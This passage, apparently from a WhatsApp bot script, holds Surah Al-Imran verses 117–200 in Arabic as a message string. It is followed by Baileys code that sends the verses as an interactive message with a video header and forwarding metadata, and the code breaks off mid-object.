مَثَلُ مَا يُنْفِقُوْنَ فِيْ هٰذِهِ الْحَيٰوةِ الدُّنْيَا كَمَثَلِ رِيْحٍ فِيْهَا صِرٌّ اَصَابَتْ حَرْثَ قَوْمٍ ظَلَمُوْٓا اَنْفُسَهُمْ فَاَهْلَكَتْهُ ۗ وَمَا ظَلَمَهُمُ اللّٰهُ وَلٰكِنْ اَنْفُسَهُمْ يَظْلِمُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَتَّخِذُوْا بِطَانَةً مِّنْ دُوْنِكُمْ لَا يَأْلُوْنَكُمْ خَبَالًا ۗ وَدُّوْا مَا عَنِتُّمْ ۚ قَدْ بَدَتِ الْبَغْضَاۤءُ مِنْ اَفْوَاهِهِمْ ۖ وَمَا تُخْفِيْ صُدُوْرُهُمْ اَكْبَرُ ۗ قَدْ بَيَّنَّا لَكُمُ الْاٰيٰتِ اِنْ كُنْتُمْ تَعْقِلُوْنَ
هٰٓاَنْتُمْ اُولَاۤءِ تُحِبُّوْنَهُمْ وَلَا يُحِبُّوْنَكُمْ وَتُؤْمِنُوْنَ بِالْكِتٰبِ كُلِّهٖ ۚ وَاِذَا لَقُوْكُمْ قَالُوْٓا اٰمَنَّا ۖ وَاِذَا خَلَوْا عَضُّوْا عَلَيْكُمُ الْاَنَامِلَ مِنَ الْغَيْظِ ۗ قُلْ مُوْتُوْا بِغَيْظِكُمْ ۗ اِنَّ اللّٰهَ عَلِيْمٌۢ بِذَاتِ الصُّدُوْرِ
اِنْ تَمْسَسْكُمْ حَسَنَةٌ تَسُؤْهُمْ ۖ وَاِنْ تُصِبْكُمْ سَيِّئَةٌ يَّفْرَحُوْا بِهَا ۗ وَاِنْ تَصْبِرُوْا وَتَتَّقُوْا لَا يَضُرُّكُمْ كَيْدُهُمْ شَيْـًٔا ۗ اِنَّ اللّٰهَ بِمَا يَعْمَلُوْنَ مُحِيْطٌ
وَاِذْ غَدَوْتَ مِنْ اَهْلِكَ تُبَوِّئُ الْمُؤْمِنِيْنَ مَقَاعِدَ لِلْقِتَالِ ۗ وَاللّٰهُ سَمِيْعٌ عَلِيْمٌ
اِذْ هَمَّتْ طَّاۤىِٕفَتٰنِ مِنْكُمْ اَنْ تَفْشَلَا ۙ وَاللّٰهُ وَلِيُّهُمَا ۗ وَعَلَى اللّٰهِ فَلْيَتَوَكَّلِ الْمُؤْمِنُوْنَ
وَلَقَدْ نَصَرَكُمُ اللّٰهُ بِبَدْرٍ وَّاَنْتُمْ اَذِلَّةٌ ۚ فَاتَّقُوا اللّٰهَ لَعَلَّكُمْ تَشْكُرُوْنَ
اِذْ تَقُوْلُ لِلْمُؤْمِنِيْنَ اَلَنْ يَّكْفِيَكُمْ اَنْ يُّمِدَّكُمْ رَبُّكُمْ بِثَلٰثَةِ اٰلٰفٍ مِّنَ الْمَلٰۤىِٕكَةِ مُنْزَلِيْنَ
بَلٰى ۙ اِنْ تَصْبِرُوْا وَتَتَّقُوْا وَيَأْتُوْكُمْ مِّنْ فَوْرِهِمْ هٰذَا يُمْدِدْكُمْ رَبُّكُمْ بِخَمْسَةِ اٰلٰفٍ مِّنَ الْمَلٰۤىِٕكَةِ مُسَوِّمِيْنَ
وَمَا جَعَلَهُ اللّٰهُ اِلَّا بُشْرٰى لَكُمْ وَلِتَطْمَىِٕنَّ قُلُوْبُكُمْ بِهٖ ۗ وَمَا النَّصْرُ اِلَّا مِنْ عِنْدِ اللّٰهِ الْعَزِيْزِ الْحَكِيْمِ
لِيَقْطَعَ طَرَفًا مِّنَ الَّذِيْنَ كَفَرُوْٓا اَوْ يَكْبِتَهُمْ فَيَنْقَلِبُوْا خَاۤىِٕبِيْنَ
لَيْسَ لَكَ مِنَ الْاَمْرِ شَيْءٌ اَوْ يَتُوْبَ عَلَيْهِمْ اَوْ يُعَذِّبَهُمْ فَاِنَّهُمْ ظٰلِمُوْنَ
وَلِلّٰهِ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ يَغْفِرُ لِمَنْ يَّشَاۤءُ وَيُعَذِّبُ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَأْكُلُوا الرِّبٰوٓا اَضْعَافًا مُّضٰعَفَةً ۖ وَّاتَّقُوا اللّٰهَ لَعَلَّكُمْ تُفْلِحُوْنَ
وَاتَّقُوا النَّارَ الَّتِيْٓ اُعِدَّتْ لِلْكٰفِرِيْنَ
وَاَطِيْعُوا اللّٰهَ وَالرَّسُوْلَ لَعَلَّكُمْ تُرْحَمُوْنَ
وَسَارِعُوْٓا اِلٰى مَغْفِرَةٍ مِّنْ رَّبِّكُمْ وَجَنَّةٍ عَرْضُهَا السَّمٰوٰتُ وَالْاَرْضُ ۙ اُعِدَّتْ لِلْمُتَّقِيْنَ
الَّذِيْنَ يُنْفِقُوْنَ فِى السَّرَّاۤءِ وَالضَّرَّاۤءِ وَالْكٰظِمِيْنَ الْغَيْظَ وَالْعَافِيْنَ عَنِ النَّاسِ ۗ وَاللّٰهُ يُحِبُّ الْمُحْسِنِيْنَ
وَالَّذِيْنَ اِذَا فَعَلُوْا فَاحِشَةً اَوْ ظَلَمُوْٓا اَنْفُسَهُمْ ذَكَرُوا اللّٰهَ فَاسْتَغْفَرُوْا لِذُنُوْبِهِمْ ۗ وَمَنْ يَّغْفِرُ الذُّنُوْبَ اِلَّا اللّٰهُ ۗ وَلَمْ يُصِرُّوْا عَلٰى مَا فَعَلُوْا وَهُمْ يَعْلَمُوْنَ
اُولٰۤىِٕكَ جَزَاۤؤُهُمْ مَّغْفِرَةٌ مِّنْ رَّبِّهِمْ وَجَنّٰتٌ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَا ۗ وَنِعْمَ اَجْرُ الْعٰمِلِيْنَ
قَدْ خَلَتْ مِنْ قَبْلِكُمْ سُنَنٌ ۙ فَسِيْرُوْا فِى الْاَرْضِ فَانْظُرُوْا كَيْفَ كَانَ عَاقِبَةُ الْمُكَذِّبِيْنَ
هٰذَا بَيَانٌ لِّلنَّاسِ وَهُدًى وَّمَوْعِظَةٌ لِّلْمُتَّقِيْنَ
وَلَا تَهِنُوْا وَلَا تَحْزَنُوْا وَاَنْتُمُ الْاَعْلَوْنَ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
اِنْ يَّمْسَسْكُمْ قَرْحٌ فَقَدْ مَسَّ الْقَوْمَ قَرْحٌ مِّثْلُهٗ ۗ وَتِلْكَ الْاَيَّامُ نُدَاوِلُهَا بَيْنَ النَّاسِ ۚ وَلِيَعْلَمَ اللّٰهُ الَّذِيْنَ اٰمَنُوْا وَيَتَّخِذَ مِنْكُمْ شُهَدَاۤءَ ۗ وَاللّٰهُ لَا يُحِبُّ الظّٰلِمِيْنَ
وَلِيُمَحِّصَ اللّٰهُ الَّذِيْنَ اٰمَنُوْا وَيَمْحَقَ الْكٰفِرِيْنَ
اَمْ حَسِبْتُمْ اَنْ تَدْخُلُوا الْجَنَّةَ وَلَمَّا يَعْلَمِ اللّٰهُ الَّذِيْنَ جَاهَدُوْا مِنْكُمْ وَيَعْلَمَ الصّٰبِرِيْنَ
وَلَقَدْ كُنْتُمْ تَمَنَّوْنَ الْمَوْتَ مِنْ قَبْلِ اَنْ تَلْقَوْهُ ۖ فَقَدْ رَاَيْتُمُوْهُ وَاَنْتُمْ تَنْظُرُوْنَ
وَمَا مُحَمَّدٌ اِلَّا رَسُوْلٌ ۚ قَدْ خَلَتْ مِنْ قَبْلِهِ الرُّسُلُ ۗ اَفَا۟ىِٕنْ مَّاتَ اَوْ قُتِلَ انْقَلَبْتُمْ عَلٰٓى اَعْقَابِكُمْ ۗ وَمَنْ يَّنْقَلِبْ عَلٰى عَقِبَيْهِ فَلَنْ يَّضُرَّ اللّٰهَ شَيْـًٔا ۗ وَسَيَجْزِى اللّٰهُ الشّٰكِرِيْنَ
وَمَا كَانَ لِنَفْسٍ اَنْ تَمُوْتَ اِلَّا بِاِذْنِ اللّٰهِ كِتٰبًا مُّؤَجَّلًا ۗ وَمَنْ يُّرِدْ ثَوَابَ الدُّنْيَا نُؤْتِهٖ مِنْهَا ۚ وَمَنْ يُّرِدْ ثَوَابَ الْاٰخِرَةِ نُؤْتِهٖ مِنْهَا ۗ وَسَنَجْزِى الشّٰكِرِيْنَ
وَكَاَيِّنْ مِّنْ نَّبِيٍّ قٰتَلَۙ مَعَهٗ رِبِّيُّوْنَ كَثِيْرٌ ۚ فَمَا وَهَنُوْا لِمَآ اَصَابَهُمْ فِيْ سَبِيْلِ اللّٰهِ وَمَا ضَعُفُوْا وَمَا اسْتَكَانُوْا ۗ وَاللّٰهُ يُحِبُّ الصّٰبِرِيْنَ
وَمَا كَانَ قَوْلَهُمْ اِلَّآ اَنْ قَالُوْا رَبَّنَا اغْفِرْ لَنَا ذُنُوْبَنَا وَاِسْرَافَنَا فِيْٓ اَمْرِنَا وَثَبِّتْ اَقْدَامَنَا وَانْصُرْنَا عَلَى الْقَوْمِ الْكٰفِرِيْنَ
فَاٰتٰىهُمُ اللّٰهُ ثَوَابَ الدُّنْيَا وَحُسْنَ ثَوَابِ الْاٰخِرَةِ ۗ وَاللّٰهُ يُحِبُّ الْمُحْسِنِيْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِنْ تُطِيْعُوا الَّذِيْنَ كَفَرُوْا يَرُدُّوْكُمْ عَلٰٓى اَعْقَابِكُمْ فَتَنْقَلِبُوْا خٰسِرِيْنَ
بَلِ اللّٰهُ مَوْلٰىكُمْ ۚ وَهُوَ خَيْرُ النّٰصِرِيْنَ
سَنُلْقِيْ فِيْ قُلُوْبِ الَّذِيْنَ كَفَرُوا الرُّعْبَ بِمَآ اَشْرَكُوْا بِاللّٰهِ مَا لَمْ يُنَزِّلْ بِهٖ سُلْطٰنًا ۚ وَمَأْوٰىهُمُ النَّارُ ۗ وَبِئْسَ مَثْوَى الظّٰلِمِيْنَ
وَلَقَدْ صَدَقَكُمُ اللّٰهُ وَعْدَهٗٓ اِذْ تَحُسُّوْنَهُمْ بِاِذْنِهٖ ۚ حَتّٰىٓ اِذَا فَشِلْتُمْ وَتَنَازَعْتُمْ فِى الْاَمْرِ وَعَصَيْتُمْ مِّنْۢ بَعْدِ مَآ اَرٰىكُمْ مَّا تُحِبُّوْنَ ۗ مِنْكُمْ مَّنْ يُّرِيْدُ الدُّنْيَا وَمِنْكُمْ مَّنْ يُّرِيْدُ الْاٰخِرَةَ ۚ ثُمَّ صَرَفَكُمْ عَنْهُمْ لِيَبْتَلِيَكُمْ ۚ وَلَقَدْ عَفَا عَنْكُمْ ۗ وَاللّٰهُ ذُوْ فَضْلٍ عَلَى الْمُؤْمِنِيْنَ
اِذْ تُصْعِدُوْنَ وَلَا تَلْوٗنَ عَلٰٓى اَحَدٍ وَّالرَّسُوْلُ يَدْعُوْكُمْ فِيْٓ اُخْرٰىكُمْ فَاَثَابَكُمْ غَمًّا ۢ بِغَمٍّ لِّكَيْلَا تَحْزَنُوْا عَلٰى مَا فَاتَكُمْ وَلَا مَآ اَصَابَكُمْ ۗ وَاللّٰهُ خَبِيْرٌۢ بِمَا تَعْمَلُوْنَ
ثُمَّ اَنْزَلَ عَلَيْكُمْ مِّنْۢ بَعْدِ الْغَمِّ اَمَنَةً نُّعَاسًا يَّغْشٰى طَاۤىِٕفَةً مِّنْكُمْ ۙ وَطَاۤىِٕفَةٌ قَدْ اَهَمَّتْهُمْ اَنْفُسُهُمْ يَظُنُّوْنَ بِاللّٰهِ غَيْرَ الْحَقِّ ظَنَّ الْجَاهِلِيَّةِ ۗ يَقُوْلُوْنَ هَلْ لَّنَا مِنَ الْاَمْرِ مِنْ شَيْءٍ ۗ قُلْ اِنَّ الْاَمْرَ كُلَّهٗ لِلّٰهِ ۗ يُخْفُوْنَ فِيْٓ اَنْفُسِهِمْ مَّا لَا يُبْدُوْنَ لَكَ ۗ يَقُوْلُوْنَ لَوْ كَانَ لَنَا مِنَ الْاَمْرِ شَيْءٌ مَّا قُتِلْنَا هٰهُنَا ۗ قُلْ لَّوْ كُنْتُمْ فِيْ بُيُوْتِكُمْ لَبَرَزَ الَّذِيْنَ كُتِبَ عَلَيْهِمُ الْقَتْلُ اِلٰى مَضَاجِعِهِمْ ۚ وَلِيَبْتَلِيَ اللّٰهُ مَا فِيْ صُدُوْرِكُمْ وَلِيُمَحِّصَ مَا فِيْ قُلُوْبِكُمْ ۗ وَاللّٰهُ عَلِيْمٌۢ بِذَاتِ الصُّدُوْرِ
اِنَّ الَّذِيْنَ تَوَلَّوْا مِنْكُمْ يَوْمَ الْتَقَى الْجَمْعٰنِ اِنَّمَا اسْتَزَلَّهُمُ الشَّيْطٰنُ بِبَعْضِ مَا كَسَبُوْا ۚ وَلَقَدْ عَفَا اللّٰهُ عَنْهُمْ ۗ اِنَّ اللّٰهَ غَفُوْرٌ حَلِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَكُوْنُوْا كَالَّذِيْنَ كَفَرُوْا وَقَالُوْا لِاِخْوَانِهِمْ اِذَا ضَرَبُوْا فِى الْاَرْضِ اَوْ كَانُوْا غُزًّى لَّوْ كَانُوْا عِنْدَنَا مَا مَاتُوْا وَمَا قُتِلُوْا ۚ لِيَجْعَلَ اللّٰهُ ذٰلِكَ حَسْرَةً فِيْ قُلُوْبِهِمْ ۗ وَاللّٰهُ يُحْيٖ وَيُمِيْتُ ۗ وَاللّٰهُ بِمَا تَعْمَلُوْنَ بَصِيْرٌ
وَلَىِٕنْ قُتِلْتُمْ فِيْ سَبِيْلِ اللّٰهِ اَوْ مُتُّمْ لَمَغْفِرَةٌ مِّنَ اللّٰهِ وَرَحْمَةٌ خَيْرٌ مِّمَّا يَجْمَعُوْنَ
وَلَىِٕنْ مُّتُّمْ اَوْ قُتِلْتُمْ لَاِلَى اللّٰهِ تُحْشَرُوْنَ
فَبِمَا رَحْمَةٍ مِّنَ اللّٰهِ لِنْتَ لَهُمْ ۚ وَلَوْ كُنْتَ فَظًّا غَلِيْظَ الْقَلْبِ لَانْفَضُّوْا مِنْ حَوْلِكَ ۖ فَاعْفُ عَنْهُمْ وَاسْتَغْفِرْ لَهُمْ وَشَاوِرْهُمْ فِى الْاَمْرِ ۚ فَاِذَا عَزَمْتَ فَتَوَكَّلْ عَلَى اللّٰهِ ۗ اِنَّ اللّٰهَ يُحِبُّ الْمُتَوَكِّلِيْنَ
اِنْ يَّنْصُرْكُمُ اللّٰهُ فَلَا غَالِبَ لَكُمْ ۚ وَاِنْ يَّخْذُلْكُمْ فَمَنْ ذَا الَّذِيْ يَنْصُرُكُمْ مِّنْۢ بَعْدِهٖ ۗ وَعَلَى اللّٰهِ فَلْيَتَوَكَّلِ الْمُؤْمِنُوْنَ
وَمَا كَانَ لِنَبِيٍّ اَنْ يَّغُلَّ ۗ وَمَنْ يَّغْلُلْ يَأْتِ بِمَا غَلَّ يَوْمَ الْقِيٰمَةِ ۚ ثُمَّ تُوَفّٰى كُلُّ نَفْسٍ مَّا كَسَبَتْ وَهُمْ لَا يُظْلَمُوْنَ
اَفَمَنِ اتَّبَعَ رِضْوَانَ اللّٰهِ كَمَنْۢ بَاۤءَ بِسَخَطٍ مِّنَ اللّٰهِ وَمَأْوٰىهُ جَهَنَّمُ ۗ وَبِئْسَ الْمَصِيْرُ
هُمْ دَرَجٰتٌ عِنْدَ اللّٰهِ ۗ وَاللّٰهُ بَصِيْرٌۢ بِمَا يَعْمَلُوْنَ
لَقَدْ مَنَّ اللّٰهُ عَلَى الْمُؤْمِنِيْنَ اِذْ بَعَثَ فِيْهِمْ رَسُوْلًا مِّنْ اَنْفُسِهِمْ يَتْلُوْا عَلَيْهِمْ اٰيٰتِهٖ وَيُزَكِّيْهِمْ وَيُعَلِّمُهُمُ الْكِتٰبَ وَالْحِكْمَةَ ۚ وَاِنْ كَانُوْا مِنْ قَبْلُ لَفِيْ ضَلٰلٍ مُّبِيْنٍ
اَوَلَمَّآ اَصَابَتْكُمْ مُّصِيْبَةٌ قَدْ اَصَبْتُمْ مِّثْلَيْهَا قُلْتُمْ اَنّٰى هٰذَا ۗ قُلْ هُوَ مِنْ عِنْدِ اَنْفُسِكُمْ ۗ اِنَّ اللّٰهَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
وَمَآ اَصَابَكُمْ يَوْمَ الْتَقَى الْجَمْعٰنِ فَبِاِذْنِ اللّٰهِ وَلِيَعْلَمَ الْمُؤْمِنِيْنَ
وَلِيَعْلَمَ الَّذِيْنَ نَافَقُوْا ۖ وَقِيْلَ لَهُمْ تَعَالَوْا قَاتِلُوْا فِيْ سَبِيْلِ اللّٰهِ اَوِ ادْفَعُوْا ۚ قَالُوْا لَوْ نَعْلَمُ قِتَالًا لَّاتَّبَعْنٰكُمْ ۗ هُمْ لِلْكُفْرِ يَوْمَىِٕذٍ اَقْرَبُ مِنْهُمْ لِلْاِيْمَانِ ۚ يَقُوْلُوْنَ بِاَفْوَاهِهِمْ مَّا لَيْسَ فِيْ قُلُوْبِهِمْ ۗ وَاللّٰهُ اَعْلَمُ بِمَا يَكْتُمُوْنَ
اَلَّذِيْنَ قَالُوْا لِاِخْوَانِهِمْ وَقَعَدُوْا لَوْ اَطَاعُوْنَا مَا قُتِلُوْا ۗ قُلْ فَادْرَءُوْا عَنْ اَنْفُسِكُمُ الْمَوْتَ اِنْ كُنْتُمْ صٰدِقِيْنَ
وَلَا تَحْسَبَنَّ الَّذِيْنَ قُتِلُوْا فِيْ سَبِيْلِ اللّٰهِ اَمْوَاتًا ۗ بَلْ اَحْيَاۤءٌ عِنْدَ رَبِّهِمْ يُرْزَقُوْنَ
فَرِحِيْنَ بِمَآ اٰتٰىهُمُ اللّٰهُ مِنْ فَضْلِهٖ ۙ وَيَسْتَبْشِرُوْنَ بِالَّذِيْنَ لَمْ يَلْحَقُوْا بِهِمْ مِّنْ خَلْفِهِمْ اَلَّا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
يَسْتَبْشِرُوْنَ بِنِعْمَةٍ مِّنَ اللّٰهِ وَفَضْلٍ ۙ وَّاَنَّ اللّٰهَ لَا يُضِيْعُ اَجْرَ الْمُؤْمِنِيْنَ
اَلَّذِيْنَ اسْتَجَابُوْا لِلّٰهِ وَالرَّسُوْلِ مِنْۢ بَعْدِ مَآ اَصَابَهُمُ الْقَرْحُ ۚ لِلَّذِيْنَ اَحْسَنُوْا مِنْهُمْ وَاتَّقَوْا اَجْرٌ عَظِيْمٌ
اَلَّذِيْنَ قَالَ لَهُمُ النَّاسُ اِنَّ النَّاسَ قَدْ جَمَعُوْا لَكُمْ فَاخْشَوْهُمْ فَزَادَهُمْ اِيْمَانًا ۖ وَّقَالُوْا حَسْبُنَا اللّٰهُ وَنِعْمَ الْوَكِيْلُ
فَانْقَلَبُوْا بِنِعْمَةٍ مِّنَ اللّٰهِ وَفَضْلٍ لَّمْ يَمْسَسْهُمْ سُوْۤءٌ ۙ وَّاتَّبَعُوْا رِضْوَانَ اللّٰهِ ۗ وَاللّٰهُ ذُوْ فَضْلٍ عَظِيْمٍ
اِنَّمَا ذٰلِكُمُ الشَّيْطٰنُ يُخَوِّفُ اَوْلِيَاۤءَهٗ فَلَا تَخَافُوْهُمْ وَخَافُوْنِ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
وَلَا يَحْزُنْكَ الَّذِيْنَ يُسَارِعُوْنَ فِى الْكُفْرِ ۚ اِنَّهُمْ لَنْ يَّضُرُّوا اللّٰهَ شَيْـًٔا ۗ يُرِيْدُ اللّٰهُ اَلَّا يَجْعَلَ لَهُمْ حَظًّا فِى الْاٰخِرَةِ ۚ وَلَهُمْ عَذَابٌ عَظِيْمٌ
اِنَّ الَّذِيْنَ اشْتَرَوُا الْكُفْرَ بِالْاِيْمَانِ لَنْ يَّضُرُّوا اللّٰهَ شَيْـًٔا ۚ وَلَهُمْ عَذَابٌ اَلِيْمٌ
وَلَا يَحْسَبَنَّ الَّذِيْنَ كَفَرُوْٓا اَنَّمَا نُمْلِيْ لَهُمْ خَيْرٌ لِّاَنْفُسِهِمْ ۗ اِنَّمَا نُمْلِيْ لَهُمْ لِيَزْدَادُوْٓا اِثْمًا ۚ وَلَهُمْ عَذَابٌ مُّهِيْنٌ
مَا كَانَ اللّٰهُ لِيَذَرَ الْمُؤْمِنِيْنَ عَلٰى مَآ اَنْتُمْ عَلَيْهِ حَتّٰى يَمِيْزَ الْخَبِيْثَ مِنَ الطَّيِّبِ ۗ وَمَا كَانَ اللّٰهُ لِيُطْلِعَكُمْ عَلَى الْغَيْبِ وَلٰكِنَّ اللّٰهَ يَجْتَبِيْ مِنْ رُّسُلِهٖ مَنْ يَّشَاۤءُ ۖ فَاٰمِنُوْا بِاللّٰهِ وَرُسُلِهٖ ۚ وَاِنْ تُؤْمِنُوْا وَتَتَّقُوْا فَلَكُمْ اَجْرٌ عَظِيْمٌ
وَلَا يَحْسَبَنَّ الَّذِيْنَ يَبْخَلُوْنَ بِمَآ اٰتٰىهُمُ اللّٰهُ مِنْ فَضْلِهٖ هُوَ خَيْرًا لَّهُمْ ۗ بَلْ هُوَ شَرٌّ لَّهُمْ ۗ سَيُطَوَّقُوْنَ مَا بَخِلُوْا بِهٖ يَوْمَ الْقِيٰمَةِ ۗ وَلِلّٰهِ مِيْرَاثُ السَّمٰوٰتِ وَالْاَرْضِ ۗ وَاللّٰهُ بِمَا تَعْمَلُوْنَ خَبِيْرٌ
لَقَدْ سَمِعَ اللّٰهُ قَوْلَ الَّذِيْنَ قَالُوْٓا اِنَّ اللّٰهَ فَقِيْرٌ وَّنَحْنُ اَغْنِيَاۤءُ ۘ سَنَكْتُبُ مَا قَالُوْا وَقَتْلَهُمُ الْاَنْۢبِيَاۤءَ بِغَيْرِ حَقٍّۙ وَّنَقُوْلُ ذُوْقُوْا عَذَابَ الْحَرِيْقِ
ذٰلِكَ بِمَا قَدَّمَتْ اَيْدِيْكُمْ وَاَنَّ اللّٰهَ لَيْسَ بِظَلَّامٍ لِّلْعَبِيْدِ
اَلَّذِيْنَ قَالُوْٓا اِنَّ اللّٰهَ عَهِدَ اِلَيْنَآ اَلَّا نُؤْمِنَ لِرَسُوْلٍ حَتّٰى يَأْتِيَنَا بِقُرْبَانٍ تَأْكُلُهُ النَّارُ ۗ قُلْ قَدْ جَاۤءَكُمْ رُسُلٌ مِّنْ قَبْلِيْ بِالْبَيِّنٰتِ وَبِالَّذِيْ قُلْتُمْ فَلِمَ قَتَلْتُمُوْهُمْ اِنْ كُنْتُمْ صٰدِقِيْنَ
فَاِنْ كَذَّبُوْكَ فَقَدْ كُذِّبَ رُسُلٌ مِّنْ قَبْلِكَ جَاۤءُوْ بِالْبَيِّنٰتِ وَالزُّبُرِ وَالْكِتٰبِ الْمُنِيْرِ
كُلُّ نَفْسٍ ذَاۤىِٕقَةُ الْمَوْتِ ۗ وَاِنَّمَا تُوَفَّوْنَ اُجُوْرَكُمْ يَوْمَ الْقِيٰمَةِ ۗ فَمَنْ زُحْزِحَ عَنِ النَّارِ وَاُدْخِلَ الْجَنَّةَ فَقَدْ فَازَ ۗ وَمَا الْحَيٰوةُ الدُّنْيَآ اِلَّا مَتَاعُ الْغُرُوْرِ
لَتُبْلَوُنَّ فِيْٓ اَمْوَالِكُمْ وَاَنْفُسِكُمْ ۗ وَلَتَسْمَعُنَّ مِنَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ مِنْ قَبْلِكُمْ وَمِنَ الَّذِيْنَ اَشْرَكُوْٓا اَذًى كَثِيْرًا ۗ وَاِنْ تَصْبِرُوْا وَتَتَّقُوْا فَاِنَّ ذٰلِكَ مِنْ عَزْمِ الْاُمُوْرِ
وَاِذْ اَخَذَ اللّٰهُ مِيْثَاقَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ لَتُبَيِّنُنَّهٗ لِلنَّاسِ وَلَا تَكْتُمُوْنَهٗ ۖ فَنَبَذُوْهُ وَرَاۤءَ ظُهُوْرِهِمْ وَاشْتَرَوْا بِهٖ ثَمَنًا قَلِيْلًا ۗ فَبِئْسَ مَا يَشْتَرُوْنَ
لَا تَحْسَبَنَّ الَّذِيْنَ يَفْرَحُوْنَ بِمَآ اَتَوْا وَّيُحِبُّوْنَ اَنْ يُّحْمَدُوْا بِمَا لَمْ يَفْعَلُوْا فَلَا تَحْسَبَنَّهُمْ بِمَفَازَةٍ مِّنَ الْعَذَابِ ۚ وَلَهُمْ عَذَابٌ اَلِيْمٌ
وَلِلّٰهِ مُلْكُ السَّمٰوٰتِ وَالْاَرْضِ ۗ وَاللّٰهُ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
اِنَّ فِيْ خَلْقِ السَّمٰوٰتِ وَالْاَرْضِ وَاخْتِلَافِ الَّيْلِ وَالنَّهَارِ لَاٰيٰتٍ لِّاُولِى الْاَلْبَابِ
اَلَّذِيْنَ يَذْكُرُوْنَ اللّٰهَ قِيَامًا وَّقُعُوْدًا وَّعَلٰى جُنُوْبِهِمْ وَيَتَفَكَّرُوْنَ فِيْ خَلْقِ السَّمٰوٰتِ وَالْاَرْضِ ۚ رَبَّنَا مَا خَلَقْتَ هٰذَا بَاطِلًا ۚ سُبْحٰنَكَ فَقِنَا عَذَابَ النَّارِ
رَبَّنَآ اِنَّكَ مَنْ تُدْخِلِ النَّارَ فَقَدْ اَخْزَيْتَهٗ ۗ وَمَا لِلظّٰلِمِيْنَ مِنْ اَنْصَارٍ
رَبَّنَآ اِنَّنَا سَمِعْنَا مُنَادِيًا يُّنَادِيْ لِلْاِيْمَانِ اَنْ اٰمِنُوْا بِرَبِّكُمْ فَاٰمَنَّا ۖ رَبَّنَا فَاغْفِرْ لَنَا ذُنُوْبَنَا وَكَفِّرْ عَنَّا سَيِّاٰتِنَا وَتَوَفَّنَا مَعَ الْاَبْرَارِ
رَبَّنَا وَاٰتِنَا مَا وَعَدْتَّنَا عَلٰى رُسُلِكَ وَلَا تُخْزِنَا يَوْمَ الْقِيٰمَةِ ۗ اِنَّكَ لَا تُخْلِفُ الْمِيْعَادَ
فَاسْتَجَابَ لَهُمْ رَبُّهُمْ اَنِّيْ لَآ اُضِيْعُ عَمَلَ عَامِلٍ مِّنْكُمْ مِّنْ ذَكَرٍ اَوْ اُنْثٰى ۚ بَعْضُكُمْ مِّنْۢ بَعْضٍ ۚ فَالَّذِيْنَ هَاجَرُوْا وَاُخْرِجُوْا مِنْ دِيَارِهِمْ وَاُوْذُوْا فِيْ سَبِيْلِيْ وَقٰتَلُوْا وَقُتِلُوْا لَاُكَفِّرَنَّ عَنْهُمْ سَيِّاٰتِهِمْ وَلَاُدْخِلَنَّهُمْ جَنّٰتٍ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ ۚ ثَوَابًا مِّنْ عِنْدِ اللّٰهِ ۗ وَاللّٰهُ عِنْدَهٗ حُسْنُ الثَّوَابِ
لَا يَغُرَّنَّكَ تَقَلُّبُ الَّذِيْنَ كَفَرُوْا فِى الْبِلَادِ
مَتَاعٌ قَلِيْلٌ ثُمَّ مَأْوٰىهُمْ جَهَنَّمُ ۗ وَبِئْسَ الْمِهَادُ
لٰكِنِ الَّذِيْنَ اتَّقَوْا رَبَّهُمْ لَهُمْ جَنّٰتٌ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَا نُزُلًا مِّنْ عِنْدِ اللّٰهِ ۗ وَمَا عِنْدَ اللّٰهِ خَيْرٌ لِّلْاَبْرَارِ
وَاِنَّ مِنْ اَهْلِ الْكِتٰبِ لَمَنْ يُّؤْمِنُ بِاللّٰهِ وَمَآ اُنْزِلَ اِلَيْكُمْ وَمَآ اُنْزِلَ اِلَيْهِمْ خٰشِعِيْنَ لِلّٰهِ ۙ لَا يَشْتَرُوْنَ بِاٰيٰتِ اللّٰهِ ثَمَنًا قَلِيْلًا ۗ اُولٰۤىِٕكَ لَهُمْ اَجْرُهُمْ عِنْدَ رَبِّهِمْ ۗ اِنَّ اللّٰهَ سَرِيْعُ الْحِسَابِ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا اصْبِرُوْا وَصَابِرُوْا وَرَابِطُوْا وَاتَّقُوا اللّٰهَ لَعَلَّكُمْ تُفْلِحُوْنَ

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
